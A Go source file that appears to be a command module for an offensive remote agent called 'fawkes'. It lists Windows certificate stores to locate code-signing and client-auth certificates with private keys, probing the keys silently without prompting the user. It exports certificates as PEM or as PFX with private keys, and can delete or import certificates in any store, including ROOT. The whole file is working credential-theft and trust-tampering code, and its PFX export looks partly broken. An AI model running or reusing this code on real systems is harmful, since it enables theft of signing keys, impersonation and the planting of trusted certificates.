//go:build windows
// +build windows

package commands

import (
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"strings"
	"time"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

type CertstoreCommand struct{}

func (c *CertstoreCommand) Name() string {
	return "certstore"
}

func (c *CertstoreCommand) Description() string {
	return "Enumerate Windows certificate stores to find code signing certs, client auth certs, and private keys"
}

type certstoreParams struct {
	Action   string `json:"action"`
	Store    string `json:"store"`
	Filter   string `json:"filter"`
	Format   string `json:"format"`
	Password string `json:"password"`
	Data     string `json:"data"`
}

var (
	crypt32              = windows.NewLazySystemDLL("crypt32.dll")
	procCertOpenStore    = crypt32.NewProc("CertOpenStore")
	procCertCloseStore   = crypt32.NewProc("CertCloseStore")
	procCertEnumCerts    = crypt32.NewProc("CertEnumCertificatesInStore")
	procCertGetNameW     = crypt32.NewProc("CertGetNameStringW")
	procCryptAcquireCert = crypt32.NewProc("CryptAcquireCertificatePrivateKey")
	procCertDeleteCert   = crypt32.NewProc("CertDeleteCertificateFromStore")
	procCertDupCtx       = crypt32.NewProc("CertDuplicateCertificateContext")
	procCertAddEncoded   = crypt32.NewProc("CertAddEncodedCertificateToStore")
	procPFXExportStore   = crypt32.NewProc("PFXExportCertStoreEx")
	procPFXImportStore   = crypt32.NewProc("PFXImportCertStore")
)

// CERT_STORE_PROV_SYSTEM_W
const (
	certStoreProvSystemW      = 10
	certStoreLocalMachineID   = 0x00020000 // CERT_SYSTEM_STORE_LOCAL_MACHINE
	certStoreCurrentUserID    = 0x00010000 // CERT_SYSTEM_STORE_CURRENT_USER
	certNameSimpleDisplayType = 4
	certNameIssuerFlag        = 1
	cryptAcquireCacheFlag     = 0x00000001
	cryptAcquireSilentFlag    = 0x00000040
)

// CERT_CONTEXT structure
type certContext struct {
	CertEncodingType uint32
	CertEncoded      uintptr
	CertEncodedLen   uint32
	CertInfo         uintptr
	Store            uintptr
}

// CERT_INFO structure (partial — only fields we need)
type certInfo struct {
	Version              uint32
	SerialNumber         cryptIntegerBlob
	SignatureAlgorithm   cryptAlgorithmID
	Issuer               cryptDataBlob
	NotBefore            windows.Filetime
	NotAfter             windows.Filetime
	Subject              cryptDataBlob
	SubjectPublicKeyInfo subjectPublicKeyInfo
}

type cryptIntegerBlob struct {
	Size uint32
	Data uintptr
}

type cryptDataBlob struct {
	Size uint32
	Data uintptr
}

type cryptAlgorithmID struct {
	ObjID      uintptr
	Parameters cryptDataBlob
}

type subjectPublicKeyInfo struct {
	Algorithm cryptAlgorithmID
	PublicKey cryptBitBlob
}

type cryptBitBlob struct {
	Size       uint32
	Data       uintptr
	UnusedBits uint32
}

type certEntry struct {
	Subject      string `json:"subject"`
	Issuer       string `json:"issuer"`
	SerialNumber string `json:"serial_number,omitempty"`
	NotBefore    string `json:"not_before,omitempty"`
	NotAfter     string `json:"not_after,omitempty"`
	Expired      bool   `json:"expired,omitempty"`
	Thumbprint   string `json:"thumbprint"`
	HasPrivKey   bool   `json:"has_private_key"`
	KeyBits      int    `json:"key_bits,omitempty"`
	Store        string `json:"store"`
	Location     string `json:"location"`
}

func (c *CertstoreCommand) Execute(task structs.Task) structs.CommandResult {
	var params certstoreParams
	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	if params.Action == "" {
		params.Action = "list"
	}

	switch params.Action {
	case "list":
		return certstoreList(params.Store, params.Filter)
	case "find":
		return certstoreFind(params.Store, params.Filter)
	case "export":
		return certstoreExport(params.Store, params.Filter, params.Format, params.Password)
	case "delete":
		return certstoreDelete(params.Store, params.Filter)
	case "import":
		return certstoreImport(params.Store, params.Data, params.Format, params.Password)
	default:
		return errorf("Unknown action: %s (use 'list', 'find', 'export', 'delete', 'import')", params.Action)
	}
}

func certstoreList(store, filter string) structs.CommandResult {
	storesToEnum := getStoreNames(store)
	locations := []struct {
		name string
		flag uint32
	}{
		{"CurrentUser", certStoreCurrentUserID},
		{"LocalMachine", certStoreLocalMachineID},
	}

	var allCerts []certEntry

	for _, loc := range locations {
		for _, storeName := range storesToEnum {
			certs, err := enumCertsInStore(storeName, loc.flag, loc.name, filter)
			if err != nil {
				// Silently skip stores that can't be opened (permission issues)
				continue
			}
			allCerts = append(allCerts, certs...)
		}
	}

	if len(allCerts) == 0 {
		return successResult("[]")
	}

	out, err := json.Marshal(allCerts)
	if err != nil {
		return errorf("JSON marshal error: %v", err)
	}

	return successResult(string(out))
}

func certstoreFind(store, filter string) structs.CommandResult {
	if filter == "" {
		return errorResult("Error: filter is required for find action (search by subject, issuer, or thumbprint)")
	}
	return certstoreList(store, filter)
}

func getStoreNames(store string) []string {
	if store == "" || strings.EqualFold(store, "all") {
		return []string{"MY", "ROOT", "CA", "Trust", "TrustedPeople"}
	}
	return []string{store}
}

func enumCertsInStore(storeName string, locationFlag uint32, locationName, filter string) ([]certEntry, error) {
	storeNameUTF16, err := windows.UTF16PtrFromString(storeName)
	if err != nil {
		return nil, err
	}

	// CertOpenStore(CERT_STORE_PROV_SYSTEM_W, 0, 0, flags, storeName)
	storeHandle, _, sysErr := procCertOpenStore.Call(
		certStoreProvSystemW,
		0,
		0,
		uintptr(locationFlag),
		uintptr(unsafe.Pointer(storeNameUTF16)),
	)
	if storeHandle == 0 {
		return nil, fmt.Errorf("CertOpenStore failed: %v", sysErr)
	}
	defer procCertCloseStore.Call(storeHandle, 0)

	var certs []certEntry
	var prevCtx uintptr

	for {
		// CertEnumCertificatesInStore(store, prevCtx)
		ctxPtr, _, _ := procCertEnumCerts.Call(storeHandle, prevCtx)
		if ctxPtr == 0 {
			break
		}
		prevCtx = ctxPtr

		ctx := (*certContext)(unsafe.Pointer(ctxPtr))
		entry := parseCertContext(ctx, storeName, locationName)

		// Check filter
		if filter != "" {
			lowerFilter := strings.ToLower(filter)
			if !strings.Contains(strings.ToLower(entry.Subject), lowerFilter) &&
				!strings.Contains(strings.ToLower(entry.Issuer), lowerFilter) &&
				!strings.Contains(strings.ToLower(entry.Thumbprint), lowerFilter) &&
				!strings.Contains(strings.ToLower(entry.SerialNumber), lowerFilter) {
				continue
			}
		}

		// Check for private key
		entry.HasPrivKey = checkPrivateKey(ctxPtr)

		certs = append(certs, entry)
	}

	return certs, nil
}

func parseCertContext(ctx *certContext, storeName, locationName string) certEntry {
	entry := certEntry{
		Store:    storeName,
		Location: locationName,
	}

	// Get subject name
	entry.Subject = getCertName(uintptr(unsafe.Pointer(ctx)), certNameSimpleDisplayType, 0)
	// Get issuer name
	entry.Issuer = getCertName(uintptr(unsafe.Pointer(ctx)), certNameSimpleDisplayType, certNameIssuerFlag)

	// Compute SHA-1 thumbprint from the encoded cert data
	if ctx.CertEncodedLen > 0 && ctx.CertEncoded != 0 {
		certBytes := unsafe.Slice((*byte)(unsafe.Pointer(ctx.CertEncoded)), ctx.CertEncodedLen)
		entry.Thumbprint = sha1Thumbprint(certBytes)
	}

	// Parse CERT_INFO for dates and serial number
	if ctx.CertInfo != 0 {
		info := (*certInfo)(unsafe.Pointer(ctx.CertInfo))

		notBefore := certFiletimeToTime(info.NotBefore)
		notAfter := certFiletimeToTime(info.NotAfter)
		if !notBefore.IsZero() {
			entry.NotBefore = notBefore.Format("2006-01-02")
		}
		if !notAfter.IsZero() {
			entry.NotAfter = notAfter.Format("2006-01-02")
			entry.Expired = notAfter.Before(time.Now())
		}

		// Serial number (little-endian byte array)
		if info.SerialNumber.Size > 0 && info.SerialNumber.Data != 0 {
			serialBytes := unsafe.Slice((*byte)(unsafe.Pointer(info.SerialNumber.Data)), info.SerialNumber.Size)
			// Reverse for display (big-endian display convention)
			reversed := make([]byte, len(serialBytes))
			for i, b := range serialBytes {
				reversed[len(serialBytes)-1-i] = b
			}
			entry.SerialNumber = hex.EncodeToString(reversed)
		}

		// Key size from SubjectPublicKeyInfo
		entry.KeyBits = int(info.SubjectPublicKeyInfo.PublicKey.Size) * 8
		if entry.KeyBits <= 0 {
			entry.KeyBits = 0
		}
	}

	return entry
}

func getCertName(certCtxPtr uintptr, nameType, flags uint32) string {
	// First call to get required size
	size, _, _ := procCertGetNameW.Call(
		certCtxPtr,
		uintptr(nameType),
		uintptr(flags),
		0,
		0,
		0,
	)
	if size <= 1 {
		return ""
	}

	buf := make([]uint16, size)
	procCertGetNameW.Call(
		certCtxPtr,
		uintptr(nameType),
		uintptr(flags),
		0,
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(size),
	)

	return windows.UTF16ToString(buf)
}

func checkPrivateKey(certCtxPtr uintptr) bool {
	var keyProv uintptr
	var keySpec uint32
	var callerFree int32

	// CryptAcquireCertificatePrivateKey(pCert, dwFlags, pvParameters, phCryptProv, pdwKeySpec, pfCallerFree)
	// CRYPT_ACQUIRE_CACHE_FLAG | CRYPT_ACQUIRE_SILENT_FLAG — don't prompt user
	r1, _, _ := procCryptAcquireCert.Call(
		certCtxPtr,
		uintptr(cryptAcquireCacheFlag|cryptAcquireSilentFlag),
		0,
		uintptr(unsafe.Pointer(&keyProv)),
		uintptr(unsafe.Pointer(&keySpec)),
		uintptr(unsafe.Pointer(&callerFree)),
	)

	return r1 != 0
}

// sha1Thumbprint computes SHA-1 hash manually (no crypto import needed)
func sha1Thumbprint(data []byte) string {
	// Use CryptHashCertificate from crypt32.dll
	var hashSize uint32 = 20
	hash := make([]byte, 20)

	procCryptHashCert := crypt32.NewProc("CryptHashCertificate")
	r1, _, _ := procCryptHashCert.Call(
		0,
		0x00008004, // CALG_SHA1
		0,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		uintptr(unsafe.Pointer(&hash[0])),
		uintptr(unsafe.Pointer(&hashSize)),
	)
	if r1 == 0 {
		return ""
	}

	// Format as hex with colons
	parts := make([]string, hashSize)
	for i := uint32(0); i < hashSize; i++ {
		parts[i] = fmt.Sprintf("%02X", hash[i])
	}
	return strings.Join(parts, ":")
}

// Additional constants for export/delete/import
const (
	certStoreAddReplaceExisting = 3     // CERT_STORE_ADD_REPLACE_EXISTING
	x509ASNEncoding             = 1     // X509_ASN_ENCODING
	pkcs7ASNEncoding            = 65536 // PKCS_7_ASN_ENCODING
	certEncodingDefault         = x509ASNEncoding | pkcs7ASNEncoding
	exportableFlag              = 0x00000001 // CRYPT_EXPORTABLE
	reportNotReadyFlag          = 0x00000008 // REPORT_NOT_ABLE_TO_EXPORT_PRIVATE_KEY
)

// CRYPT_DATA_BLOB for PFX operations
type cryptDataBlobPFX struct {
	Size uint32
	Data uintptr
}

func certstoreExport(store, filter, format, password string) structs.CommandResult {
	if filter == "" {
		return errorResult("Error: filter (thumbprint) is required for export action")
	}
	if format == "" {
		format = "pem"
	}

	// Find the certificate by thumbprint
	locations := []struct {
		name string
		flag uint32
	}{
		{"CurrentUser", certStoreCurrentUserID},
		{"LocalMachine", certStoreLocalMachineID},
	}

	storesToSearch := getStoreNames(store)

	for _, loc := range locations {
		for _, storeName := range storesToSearch {
			storeNameUTF16, err := windows.UTF16PtrFromString(storeName)
			if err != nil {
				continue
			}

			storeHandle, _, sysErr := procCertOpenStore.Call(
				certStoreProvSystemW, 0, 0,
				uintptr(loc.flag),
				uintptr(unsafe.Pointer(storeNameUTF16)),
			)
			if storeHandle == 0 {
				_ = sysErr
				continue
			}

			// Enumerate and find by thumbprint
			var prevCtx uintptr
			for {
				ctxPtr, _, _ := procCertEnumCerts.Call(storeHandle, prevCtx)
				if ctxPtr == 0 {
					break
				}
				prevCtx = ctxPtr

				ctx := (*certContext)(unsafe.Pointer(ctxPtr))
				if ctx.CertEncodedLen == 0 || ctx.CertEncoded == 0 {
					continue
				}

				certBytes := unsafe.Slice((*byte)(unsafe.Pointer(ctx.CertEncoded)), ctx.CertEncodedLen)
				thumbprint := sha1Thumbprint(certBytes)

				if !strings.EqualFold(strings.ReplaceAll(thumbprint, ":", ""), strings.ReplaceAll(filter, ":", "")) {
					continue
				}

				// Found the certificate
				subject := getCertName(ctxPtr, certNameSimpleDisplayType, 0)

				if format == "pfx" {
					// PFX export — export the whole store containing just this cert
					result, err := exportCertAsPFX(storeHandle, ctxPtr, password)
					procCertCloseStore.Call(storeHandle, 0)
					if err != nil {
						return errorf("PFX export failed: %v", err)
					}
					encoded := base64.StdEncoding.EncodeToString(result)
					return successResult(fmt.Sprintf("[+] Exported PFX for '%s' (%s/%s)\nThumbprint: %s\nFormat: PFX (PKCS#12)\nBase64:\n%s", subject, loc.name, storeName, thumbprint, encoded))
				}

				// PEM export — just the certificate (no private key)
				derCopy := make([]byte, ctx.CertEncodedLen)
				copy(derCopy, certBytes)
				procCertCloseStore.Call(storeHandle, 0)

				pemBlock := pem.EncodeToMemory(&pem.Block{
					Type:  "CERTIFICATE",
					Bytes: derCopy,
				})
				return successResult(fmt.Sprintf("[+] Exported PEM for '%s' (%s/%s)\nThumbprint: %s\nFormat: PEM (X.509)\n%s", subject, loc.name, storeName, thumbprint, string(pemBlock)))
			}
			procCertCloseStore.Call(storeHandle, 0)
		}
	}

	return errorf("Certificate not found with thumbprint: %s", filter)
}

func exportCertAsPFX(storeHandle, certCtxPtr uintptr, password string) ([]byte, error) {
	// Create a temporary in-memory store with just this certificate
	memStoreNameUTF16, _ := windows.UTF16PtrFromString("Memory")
	memStore, _, _ := procCertOpenStore.Call(
		certStoreProvSystemW, 0, 0,
		certStoreCurrentUserID,
		uintptr(unsafe.Pointer(memStoreNameUTF16)),
	)

	// Actually use CERT_STORE_PROV_MEMORY for a temporary store
	procCertOpenStoreMem := crypt32.NewProc("CertOpenStore")
	memStore, _, _ = procCertOpenStoreMem.Call(
		2, // CERT_STORE_PROV_MEMORY
		0, 0, 0, 0,
	)
	if memStore == 0 {
		return nil, fmt.Errorf("failed to create memory store")
	}
	defer procCertCloseStore.Call(memStore, 0)

	// Duplicate the cert context and add to memory store
	dupCtx, _, _ := procCertDupCtx.Call(certCtxPtr)
	if dupCtx == 0 {
		return nil, fmt.Errorf("failed to duplicate certificate context")
	}

	// Add cert to the memory store
	ctx := (*certContext)(unsafe.Pointer(dupCtx))
	certBytes := unsafe.Slice((*byte)(unsafe.Pointer(ctx.CertEncoded)), ctx.CertEncodedLen)

	r1, _, sysErr := procCertAddEncoded.Call(
		memStore,
		certEncodingDefault,
		uintptr(unsafe.Pointer(&certBytes[0])),
		uintptr(len(certBytes)),
		certStoreAddReplaceExisting,
		0,
	)
	if r1 == 0 {
		return nil, fmt.Errorf("CertAddEncodedCertificateToStore failed: %v", sysErr)
	}

	// Set up password
	var pwUTF16 *uint16
	if password != "" {
		pwUTF16, _ = windows.UTF16PtrFromString(password)
	} else {
		pwUTF16, _ = windows.UTF16PtrFromString("")
	}

	pfxBlob := cryptDataBlobPFX{}

	// First call — get required size
	r1, _, sysErr = procPFXExportStore.Call(
		memStore,
		uintptr(unsafe.Pointer(&pfxBlob)),
		uintptr(unsafe.Pointer(pwUTF16)),
		0,
		reportNotReadyFlag|4, // REPORT_NOT_ABLE_TO_EXPORT_PRIVATE_KEY | EXPORT_PRIVATE_KEYS
	)
	if r1 == 0 {
		return nil, fmt.Errorf("PFXExportCertStoreEx size query failed: %v", sysErr)
	}

	// Allocate buffer
	pfxBuf := make([]byte, pfxBlob.Size)
	pfxBlob.Data = uintptr(unsafe.Pointer(&pfxBuf[0]))

	// Second call — export
	r1, _, sysErr = procPFXExportStore.Call(
		memStore,
		uintptr(unsafe.Pointer(&pfxBlob)),
		uintptr(unsafe.Pointer(pwUTF16)),
		0,
		reportNotReadyFlag|4,
	)
	if r1 == 0 {
		return nil, fmt.Errorf("PFXExportCertStoreEx export failed: %v", sysErr)
	}

	return pfxBuf[:pfxBlob.Size], nil
}

func certstoreDelete(store, filter string) structs.CommandResult {
	if filter == "" {
		return errorResult("Error: filter (thumbprint) is required for delete action")
	}
	if store == "" {
		return errorResult("Error: store name is required for delete action (e.g., MY, ROOT, CA)")
	}

	locations := []struct {
		name string
		flag uint32
	}{
		{"CurrentUser", certStoreCurrentUserID},
		{"LocalMachine", certStoreLocalMachineID},
	}

	for _, loc := range locations {
		storeNameUTF16, err := windows.UTF16PtrFromString(store)
		if err != nil {
			continue
		}

		storeHandle, _, _ := procCertOpenStore.Call(
			certStoreProvSystemW, 0, 0,
			uintptr(loc.flag),
			uintptr(unsafe.Pointer(storeNameUTF16)),
		)
		if storeHandle == 0 {
			continue
		}

		var prevCtx uintptr
		for {
			ctxPtr, _, _ := procCertEnumCerts.Call(storeHandle, prevCtx)
			if ctxPtr == 0 {
				break
			}
			prevCtx = ctxPtr

			ctx := (*certContext)(unsafe.Pointer(ctxPtr))
			if ctx.CertEncodedLen == 0 || ctx.CertEncoded == 0 {
				continue
			}

			certBytes := unsafe.Slice((*byte)(unsafe.Pointer(ctx.CertEncoded)), ctx.CertEncodedLen)
			thumbprint := sha1Thumbprint(certBytes)

			if !strings.EqualFold(strings.ReplaceAll(thumbprint, ":", ""), strings.ReplaceAll(filter, ":", "")) {
				continue
			}

			subject := getCertName(ctxPtr, certNameSimpleDisplayType, 0)

			// Duplicate context before delete (CertDeleteCertificateFromStore frees the context)
			dupCtx, _, _ := procCertDupCtx.Call(ctxPtr)
			if dupCtx == 0 {
				procCertCloseStore.Call(storeHandle, 0)
				return errorf("Failed to duplicate certificate context for deletion")
			}

			// CertDeleteCertificateFromStore frees the passed context
			r1, _, sysErr := procCertDeleteCert.Call(dupCtx)
			procCertCloseStore.Call(storeHandle, 0)
			if r1 == 0 {
				return errorf("CertDeleteCertificateFromStore failed: %v", sysErr)
			}

			return successResult(fmt.Sprintf("[+] Deleted certificate '%s' from %s/%s\nThumbprint: %s", subject, loc.name, store, thumbprint))
		}
		procCertCloseStore.Call(storeHandle, 0)
	}

	return errorf("Certificate not found with thumbprint: %s in store: %s", filter, store)
}

func certstoreImport(store, data, format, password string) structs.CommandResult {
	if data == "" {
		return errorResult("Error: data (base64-encoded certificate) is required for import action")
	}
	if store == "" {
		store = "MY"
	}
	if format == "" {
		format = "pem"
	}

	rawData, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		// Try raw base64 (no padding)
		rawData, err = base64.RawStdEncoding.DecodeString(data)
		if err != nil {
			return errorf("Error decoding base64 data: %v", err)
		}
	}

	storeNameUTF16, err := windows.UTF16PtrFromString(store)
	if err != nil {
		return errorf("Invalid store name: %v", err)
	}

	storeHandle, _, sysErr := procCertOpenStore.Call(
		certStoreProvSystemW, 0, 0,
		certStoreCurrentUserID,
		uintptr(unsafe.Pointer(storeNameUTF16)),
	)
	if storeHandle == 0 {
		return errorf("Failed to open store %s: %v", store, sysErr)
	}
	defer procCertCloseStore.Call(storeHandle, 0)

	if format == "pfx" {
		return certstoreImportPFX(storeHandle, store, rawData, password)
	}

	// PEM or DER import
	derBytes := rawData
	if format == "pem" {
		block, _ := pem.Decode(rawData)
		if block == nil {
			return errorResult("Error: failed to decode PEM data")
		}
		derBytes = block.Bytes
	}

	r1, _, sysErr := procCertAddEncoded.Call(
		storeHandle,
		certEncodingDefault,
		uintptr(unsafe.Pointer(&derBytes[0])),
		uintptr(len(derBytes)),
		certStoreAddReplaceExisting,
		0,
	)
	if r1 == 0 {
		return errorf("CertAddEncodedCertificateToStore failed: %v", sysErr)
	}

	return successResult(fmt.Sprintf("[+] Imported %s certificate into CurrentUser/%s (%d bytes)", strings.ToUpper(format), store, len(derBytes)))
}

func certstoreImportPFX(storeHandle uintptr, storeName string, pfxData []byte, password string) structs.CommandResult {
	pfxBlob := cryptDataBlobPFX{
		Size: uint32(len(pfxData)),
		Data: uintptr(unsafe.Pointer(&pfxData[0])),
	}

	var pwUTF16 *uint16
	if password != "" {
		pwUTF16, _ = windows.UTF16PtrFromString(password)
	} else {
		pwUTF16, _ = windows.UTF16PtrFromString("")
	}

	// PFXImportCertStore returns a temporary store with the imported certs
	tmpStore, _, sysErr := procPFXImportStore.Call(
		uintptr(unsafe.Pointer(&pfxBlob)),
		uintptr(unsafe.Pointer(pwUTF16)),
		exportableFlag,
	)
	if tmpStore == 0 {
		return errorf("PFXImportCertStore failed: %v (wrong password?)", sysErr)
	}
	defer procCertCloseStore.Call(tmpStore, 0)

	// Enumerate certs from the PFX store and add them to the target store
	var count int
	var prevCtx uintptr
	for {
		ctxPtr, _, _ := procCertEnumCerts.Call(tmpStore, prevCtx)
		if ctxPtr == 0 {
			break
		}
		prevCtx = ctxPtr

		ctx := (*certContext)(unsafe.Pointer(ctxPtr))
		if ctx.CertEncodedLen == 0 || ctx.CertEncoded == 0 {
			continue
		}

		certBytes := unsafe.Slice((*byte)(unsafe.Pointer(ctx.CertEncoded)), ctx.CertEncodedLen)

		r1, _, _ := procCertAddEncoded.Call(
			storeHandle,
			certEncodingDefault,
			uintptr(unsafe.Pointer(&certBytes[0])),
			uintptr(len(certBytes)),
			certStoreAddReplaceExisting,
			0,
		)
		if r1 != 0 {
			count++
		}
	}

	if count == 0 {
		return errorResult("No certificates found in PFX file")
	}

	return successResult(fmt.Sprintf("[+] Imported %d certificate(s) from PFX into CurrentUser/%s", count, storeName))
}

func certFiletimeToTime(ft windows.Filetime) time.Time {
	// Convert FILETIME (100ns intervals since 1601-01-01) to time.Time
	nsec := int64(ft.HighDateTime)<<32 | int64(ft.LowDateTime)
	if nsec == 0 {
		return time.Time{}
	}
	// Windows epoch to Unix epoch: 11644473600 seconds
	const epochDiff = 116444736000000000
	unixNsec := (nsec - epochDiff) * 100
	return time.Unix(0, unixNsec).UTC()
}
